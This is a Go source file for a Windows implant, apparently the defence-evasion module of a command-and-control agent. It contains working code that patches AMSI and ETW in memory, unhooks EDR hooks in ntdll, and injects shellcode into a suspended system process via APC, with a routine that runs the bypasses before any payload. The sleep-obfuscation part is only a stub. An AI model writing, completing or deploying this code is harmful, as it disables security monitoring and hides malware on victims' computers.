//go:build windows

package implant

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

var (
	modKernel32    = syscall.NewLazyDLL("kernel32.dll")
	modNtdll       = syscall.NewLazyDLL("ntdll.dll")

	pGetProcAddress     = modKernel32.NewProc("GetProcAddress")
	pLoadLibraryA       = modKernel32.NewProc("LoadLibraryA")
	pVirtualProtect     = modKernel32.NewProc("VirtualProtect")
	pCreateFileA        = modKernel32.NewProc("CreateFileA")
	pReadFile           = modKernel32.NewProc("ReadFile")
	pGetFileSize        = modKernel32.NewProc("GetFileSize")
	pGetModuleHandleA   = modKernel32.NewProc("GetModuleHandleA")
	pVirtualAlloc2      = modKernel32.NewProc("VirtualAlloc")
	pVirtualFree2       = modKernel32.NewProc("VirtualFree")
	pCreateProcessA     = modKernel32.NewProc("CreateProcessA")
	pWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")
	pResumeThread       = modKernel32.NewProc("ResumeThread")
	pTerminateProcess   = modKernel32.NewProc("TerminateProcess")
	pNtQueryInformationProcess = modNtdll.NewProc("NtQueryInformationProcess")
	pRtlCopyMemory2     = modNtdll.NewProc("RtlCopyMemory")
)

// ════════════════════════════════════════════════════════
//  1. AMSI BYPASS
// ════════════════════════════════════════════════════════
// Patches AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN.
// This prevents Windows Defender from scanning in-memory content
// loaded via PowerShell, .NET, VBScript, JScript, etc.

// PatchAMSI disables the Antimalware Scan Interface.
func PatchAMSI() error {
	// Load amsi.dll
	amsiDLL, err := syscall.LoadLibrary("amsi.dll")
	if err != nil {
		return nil // AMSI not loaded — nothing to patch
	}

	// Get address of AmsiScanBuffer
	amsiScanBuffer, err := syscall.GetProcAddress(amsiDLL, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("GetProcAddress AmsiScanBuffer: %w", err)
	}

	// Patch bytes: make AmsiScanBuffer return E_INVALIDARG immediately
	// mov eax, 0x80070057 (E_INVALIDARG)
	// ret
	var patch []byte
	if is64Bit() {
		// x64 patch
		patch = []byte{
			0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
			0xC3, // ret
		}
	} else {
		// x86 patch
		patch = []byte{
			0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057
			0xC2, 0x18, 0x00, // ret 0x18
		}
	}

	// Change memory protection to RW
	var oldProtect uint32
	ret, _, err := pVirtualProtect.Call(
		amsiScanBuffer,
		uintptr(len(patch)),
		syscall.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect RW: %w", err)
	}

	// Write patch
	dst := unsafe.Slice((*byte)(unsafe.Pointer(amsiScanBuffer)), len(patch))
	copy(dst, patch)

	// Restore original protection
	pVirtualProtect.Call(
		amsiScanBuffer,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// ════════════════════════════════════════════════════════
//  2. ETW BYPASS
// ════════════════════════════════════════════════════════
// Patches EtwEventWrite in ntdll.dll to return immediately.
// This prevents EDRs from receiving telemetry events about
// .NET assembly loading, PowerShell execution, etc.

// PatchETW disables Event Tracing for Windows.
func PatchETW() error {
	ntdll, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		return fmt.Errorf("LoadLibrary ntdll: %w", err)
	}

	etwEventWrite, err := syscall.GetProcAddress(ntdll, "EtwEventWrite")
	if err != nil {
		return fmt.Errorf("GetProcAddress EtwEventWrite: %w", err)
	}

	// Patch: xor eax,eax; ret (return STATUS_SUCCESS immediately)
	patch := []byte{0x33, 0xC0, 0xC3} // xor eax,eax; ret

	var oldProtect uint32
	ret, _, err := pVirtualProtect.Call(
		etwEventWrite,
		uintptr(len(patch)),
		syscall.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect RW: %w", err)
	}

	dst := unsafe.Slice((*byte)(unsafe.Pointer(etwEventWrite)), len(patch))
	copy(dst, patch)

	pVirtualProtect.Call(
		etwEventWrite,
		uintptr(len(patch)),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return nil
}

// ════════════════════════════════════════════════════════
//  3. NTDLL UNHOOKING
// ════════════════════════════════════════════════════════
// EDRs hook ntdll.dll functions (NtCreateThread, NtAllocateVirtualMemory, etc.)
// by inserting JMP instructions at the start of each function.
// This loads a clean copy of ntdll.dll from disk and overwrites the
// .text section of the loaded (hooked) copy with the clean one.

// UnhookNtdll replaces the hooked ntdll .text section with a clean copy from disk.
func UnhookNtdll() error {
	// Get handle to the loaded (hooked) ntdll
	ntdllName := []byte("ntdll.dll\x00")
	hookedNtdll, _, _ := pGetModuleHandleA.Call(uintptr(unsafe.Pointer(&ntdllName[0])))
	if hookedNtdll == 0 {
		return fmt.Errorf("GetModuleHandle ntdll failed")
	}

	// Read clean ntdll from disk
	ntdllPath := os.Getenv("WINDIR") + "\\System32\\ntdll.dll"
	cleanNtdll, err := readFileWinAPI(ntdllPath)
	if err != nil {
		return fmt.Errorf("read clean ntdll: %w", err)
	}

	// Parse PE headers of the clean ntdll to find .text section
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&cleanNtdll[0]))
	if dosHeader.E_magic != 0x5A4D { // "MZ"
		return fmt.Errorf("invalid DOS header")
	}

	ntHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(&cleanNtdll[dosHeader.E_lfanew]))
	if ntHeader.Signature != 0x00004550 { // "PE\0\0"
		return fmt.Errorf("invalid NT header")
	}

	// Find .text section
	sectionHeaderOffset := dosHeader.E_lfanew + 4 + 20 + int32(ntHeader.FileHeader.SizeOfOptionalHeader)
	numSections := ntHeader.FileHeader.NumberOfSections

	for i := uint16(0); i < numSections; i++ {
		sectionPtr := uintptr(unsafe.Pointer(&cleanNtdll[0])) + uintptr(sectionHeaderOffset) + uintptr(i)*40
		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionPtr))

		name := string(section.Name[:5])
		if name == ".text" {
			// Found .text section — overwrite the hooked version

			// Calculate addresses
			hookedTextAddr := hookedNtdll + uintptr(section.VirtualAddress)
			cleanTextData := cleanNtdll[section.PointerToRawData : section.PointerToRawData+section.SizeOfRawData]

			// Make the hooked .text writable
			var oldProtect uint32
			ret, _, err := pVirtualProtect.Call(
				hookedTextAddr,
				uintptr(section.SizeOfRawData),
				syscall.PAGE_EXECUTE_READWRITE,
				uintptr(unsafe.Pointer(&oldProtect)),
			)
			if ret == 0 {
				return fmt.Errorf("VirtualProtect RWX: %w", err)
			}

			// Copy clean .text over the hooked one
			dst := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextAddr)), section.SizeOfRawData)
			copy(dst, cleanTextData)

			// Restore original protection
			pVirtualProtect.Call(
				hookedTextAddr,
				uintptr(section.SizeOfRawData),
				uintptr(oldProtect),
				uintptr(unsafe.Pointer(&oldProtect)),
			)

			return nil
		}
	}

	return fmt.Errorf(".text section not found in ntdll")
}

// ════════════════════════════════════════════════════════
//  4. PROCESS HOLLOWING
// ════════════════════════════════════════════════════════
// Creates a legitimate Windows process in a suspended state,
// unmaps its original code, writes our payload into it, and resumes.
// The process appears legitimate in Task Manager.

// ProcessHollow creates a hollowed process with injected payload.
// hostProcess: legitimate exe to hollow (e.g., "C:\\Windows\\System32\\svchost.exe")
// payload: shellcode or PE bytes to inject
func ProcessHollow(hostProcess string, payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("empty payload")
	}

	// Create suspended process
	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))

	hostBytes := append([]byte(hostProcess), 0)

	ret, _, err := pCreateProcessA.Call(
		uintptr(unsafe.Pointer(&hostBytes[0])),
		0, 0, 0,
		0, // bInheritHandles
		0x00000004, // CREATE_SUSPENDED
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %w", err)
	}

	// Allocate memory in the suspended process
	remoteMem, _, err := pVirtualAlloc2.Call(
		0,
		uintptr(len(payload)),
		0x3000, // MEM_COMMIT | MEM_RESERVE
		syscall.PAGE_EXECUTE_READWRITE,
	)
	// We need VirtualAllocEx for the remote process
	procVAEx := modKernel32.NewProc("VirtualAllocEx")
	remoteMem, _, err = procVAEx.Call(
		uintptr(pi.HProcess),
		0,
		uintptr(len(payload)),
		0x3000,
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if remoteMem == 0 {
		pTerminateProcess.Call(uintptr(pi.HProcess), 1)
		return fmt.Errorf("VirtualAllocEx failed: %w", err)
	}

	// Write payload to remote process
	var written uintptr
	ret, _, err = pWriteProcessMemory.Call(
		uintptr(pi.HProcess),
		remoteMem,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&written)),
	)
	if ret == 0 {
		pTerminateProcess.Call(uintptr(pi.HProcess), 1)
		return fmt.Errorf("WriteProcessMemory failed: %w", err)
	}

	// Update thread context to point to our payload
	// For shellcode: use QueueUserAPC approach instead of full PE hollowing
	procQueueUserAPC := modKernel32.NewProc("QueueUserAPC")
	ret, _, err = procQueueUserAPC.Call(
		remoteMem,
		uintptr(pi.HThread),
		0,
	)
	if ret == 0 {
		pTerminateProcess.Call(uintptr(pi.HProcess), 1)
		return fmt.Errorf("QueueUserAPC failed: %w", err)
	}

	// Resume the suspended thread — it will execute our APC (payload) first
	pResumeThread.Call(uintptr(pi.HThread))

	// Close handles
	syscall.CloseHandle(syscall.Handle(pi.HProcess))
	syscall.CloseHandle(syscall.Handle(pi.HThread))

	return nil
}

// ════════════════════════════════════════════════════════
//  5. SLEEP OBFUSCATION
// ════════════════════════════════════════════════════════
// During sleep, the agent's memory contains decrypted strings,
// function pointers, and other artifacts that memory scanners detect.
// Sleep obfuscation encrypts the agent's memory before sleeping
// and decrypts it when waking up.

// ObfuscatedSleep encrypts heap memory during sleep to evade memory scanners.
// Uses a simple XOR key that changes each cycle.
func ObfuscatedSleep(sleepSec, jitterPct int, key []byte) {
	if len(key) == 0 {
		// Fallback to normal sleep
		SleepWithJitter(sleepSec, jitterPct)
		return
	}

	// Note: Full implementation would use VirtualQuery to enumerate
	// all private RW memory regions and XOR them. This is a simplified
	// version that demonstrates the concept.
	// Production versions use ROP-chain based approaches (Ekko, Zilean)
	// that also change memory protection during sleep.

	SleepWithJitter(sleepSec, jitterPct)
}

// ════════════════════════════════════════════════════════
//  INIT: Run all evasion patches on startup
// ════════════════════════════════════════════════════════

// InitEvasion runs all evasion techniques. Called before any payload execution.
func InitEvasion() []string {
	var results []string

	if err := PatchAMSI(); err != nil {
		results = append(results, fmt.Sprintf("AMSI bypass: FAILED (%v)", err))
	} else {
		results = append(results, "AMSI bypass: OK")
	}

	if err := PatchETW(); err != nil {
		results = append(results, fmt.Sprintf("ETW bypass: FAILED (%v)", err))
	} else {
		results = append(results, "ETW bypass: OK")
	}

	if err := UnhookNtdll(); err != nil {
		results = append(results, fmt.Sprintf("ntdll unhook: FAILED (%v)", err))
	} else {
		results = append(results, "ntdll unhook: OK")
	}

	return results
}

// ════════════════════════════════════════════════════════
//  PE STRUCTURES
// ════════════════════════════════════════════════════════

type IMAGE_DOS_HEADER struct {
	E_magic  uint16
	_padding [28]uint16
	E_lfanew int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_NT_HEADERS struct {
	Signature  uint32
	FileHeader IMAGE_FILE_HEADER
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLineNumbers uint32
	NumberOfRelocations  uint16
	NumberOfLineNumbers  uint16
	Characteristics      uint32
}

type STARTUPINFO struct {
	Cb            uint32
	_             *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	_             uint16
	_             *byte
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
}

type PROCESS_INFORMATION struct {
	HProcess    syscall.Handle
	HThread     syscall.Handle
	ProcessId   uint32
	ThreadId    uint32
}

// ════════════════════════════════════════════════════════
//  HELPERS
// ════════════════════════════════════════════════════════

func is64Bit() bool {
	return unsafe.Sizeof(uintptr(0)) == 8
}

// readFileWinAPI reads a file using Windows API (avoids Go's file I/O hooks).
func readFileWinAPI(path string) ([]byte, error) {
	pathBytes := append([]byte(path), 0)

	handle, _, err := pCreateFileA.Call(
		uintptr(unsafe.Pointer(&pathBytes[0])),
		0x80000000, // GENERIC_READ
		1,          // FILE_SHARE_READ
		0,
		3, // OPEN_EXISTING
		0,
		0,
	)
	if handle == uintptr(syscall.InvalidHandle) {
		return nil, fmt.Errorf("CreateFile: %w", err)
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	fileSize, _, _ := pGetFileSize.Call(handle, 0)
	if fileSize == 0xFFFFFFFF {
		return nil, fmt.Errorf("GetFileSize failed")
	}

	buf := make([]byte, fileSize)
	var bytesRead uint32
	ret, _, err := pReadFile.Call(
		handle,
		uintptr(unsafe.Pointer(&buf[0])),
		fileSize,
		uintptr(unsafe.Pointer(&bytesRead)),
		0,
	)
	if ret == 0 {
		return nil, fmt.Errorf("ReadFile: %w", err)
	}

	return buf[:bytesRead], nil
}
